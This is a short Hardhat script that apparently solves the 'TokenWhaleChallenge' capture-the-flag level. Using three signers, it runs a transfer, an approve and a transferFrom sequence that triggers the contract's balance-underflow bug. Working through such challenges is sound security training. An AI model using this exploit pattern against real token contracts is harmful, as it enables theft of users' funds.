import { ethers } from 'hardhat';

const address = '0x68076c376Fbc9a8bCEFEe0d2A2d02dd64fAC58F9';

async function main() {
  const [attacker, user1, user2] = await ethers.getSigners();

  const targetFactory = await ethers.getContractFactory('TokenWhaleChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  let tx;

  console.log('1 - Sending more than a half of the tokens to user1');
  tx = await target.connect(attacker).transfer(user1.address, 501);
  await tx.wait();

  console.log('2 - Approving transfer from attacker');
  tx = await target.connect(user1).approve(attacker.address, 501);
  await tx.wait();

  console.log('3 - Sending tokens from user1 to user2');
  tx = await target.connect(attacker).transferFrom(user1.address, user2.address, 501);
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
